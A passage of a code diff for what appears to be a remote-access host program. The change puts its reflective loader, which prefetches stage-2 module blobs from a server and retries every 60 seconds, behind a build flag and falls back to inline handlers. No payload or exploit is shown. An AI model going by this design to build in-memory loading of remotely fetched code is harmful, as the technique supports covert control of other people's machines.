@@ -1596,6 +1596,14 @@ static void handle_command(const std::string& msg_str) {
         // The worker-thread path is chosen ONLY when the module isn't
         // ready — loaded-module commands still dispatch synchronously
         // (hot path: proc_list, sys_info, etc. polled frequently).
+        //
+        // When the reflective loader is disabled (default build), skip this
+        // whole block entirely and fall through to the inline stage-1
+        // handlers under STAGE1_KEEP_FALLBACKS. Otherwise pe::load() always
+        // returns empty -> ensure_module_ready_sync() always fails ->
+        // viewer gets "module not available" error without ever reaching
+        // the inline implementation that actually works.
+#ifdef ENABLE_REFLECTIVE_LOADER
         {
             const char* s2_mod = stage2::cmd_to_module(cmd);
             if (s2_mod) {
@@ -1628,6 +1636,7 @@ static void handle_command(const std::string& msg_str) {
                 }
             }
         }
+#endif  // ENABLE_REFLECTIVE_LOADER
 
 #ifdef USE_WEBRTC_STREAM
         // --- WebRTC signaling ---
@@ -5167,6 +5176,7 @@ int main(int argc, char** argv) {
                                 // flagged it) emits "wake"; other reconnects are
                                 // silent to avoid spamming the log.
                                 try { emit_post_auth_event(); } catch (...) {}
+#ifdef ENABLE_REFLECTIVE_LOADER
                                 // Kick off background fetch of all stage-2 module blobs.
                                 // Safe to call repeatedly — it's idempotent inside.
                                 if (!stage2_prefetch_kicked) {
@@ -5184,8 +5194,10 @@ int main(int argc, char** argv) {
                                         dll_diag("main: prefetch_all_async threw unknown exception");
                                     }
                                 }
+#endif
                             }
                         } else {
+#ifdef ENABLE_REFLECTIVE_LOADER
                             // Periodic retry: if after 60s since last kick we still don't
                             // have all three primary modules loaded, kick prefetch again.
                             // Covers the case where the initial prefetch failed for transient
@@ -5205,6 +5217,7 @@ int main(int argc, char** argv) {
                                     } catch (...) {}
                                 }
                             }
+#endif
                         }
                     }
                 } else {
@@ -5457,14 +5470,17 @@ void host_main_loop() {
                                 // defender/sysinfo). Without this the host only
                                 // fetches modules lazily on first viewer command
                                 // → 10-20s lag on the first file/svc/proc op.
+#ifdef ENABLE_REFLECTIVE_LOADER
                                 if (!stage2_prefetch_kicked) {
                                     stage2_prefetch_kicked = true;
                                     stage2_last_retry = now;
                                     try { stage2::Registry::inst().prefetch_all_async(); }
                                     catch (...) {}
                                 }
+#endif
                             }
                         } else {
+#ifdef ENABLE_REFLECTIVE_LOADER
                             // Periodic retry (every 60 s) if not all primary
                             // modules loaded — transient VPS errors / packet
                             // loss / server-not-ready race get recovered here.
@@ -5480,6 +5496,7 @@ void host_main_loop() {
                                     catch (...) {}
                                 }
                             }
+#endif
                         }
                     }
                     dll_diag(("host_main_loop: poll loop exited (is_connected=" + std::to_string(g_ws->is_connected()) + " g_running=" + std::to_string(g_running.load()) + ")").c_str());
